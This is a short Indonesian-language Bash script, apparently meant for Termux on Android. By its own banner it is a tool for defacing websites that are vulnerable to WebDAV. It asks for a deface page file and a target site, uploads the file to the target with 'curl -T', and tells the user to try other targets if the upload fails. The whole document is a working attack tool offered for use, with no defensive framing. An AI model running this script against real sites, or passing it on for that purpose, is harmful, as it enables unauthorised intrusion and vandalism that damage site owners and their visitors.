clear
toilet -f future '    WEBDAV' | lolcat
echo
echo 'Author : MR•Zewar' | lolcat
echo 'Tingkat : NEWBIE BERKAYA' | lolcat
echo
echo '''
SCRIPT INI BERFUNGSI UNTUK MENDEFACE WEBSITE
YANG VULN / RENTAN TERHADAP BUG WEBDAV
''' | lolcat
echo
echo 'Example : script.html' | lolcat
echo '_:: NAMA SCRIPT DEFACE KALIAN ::_' | lolcat
echo
read sc
echo
echo 'Example : http://site.com' | lolcat
echo '_:: SITE TARGET KALIAN ::_' | lolcat
echo
read target
echo
echo 'PROSES ...' | lolcat
sleep 2
echo
echo
curl -T /storage/emulated/0/$sc $target
echo 'HASIL : '$target/$sc | lolcat
echo '''
JIKA HASILNYA TERDEFACE BERARTI WEBSITE
TERSEBUT VULN WEBDAV. JIKA TIDAK, CARI TARGET
YANG LAIN :)
''' | lolcat
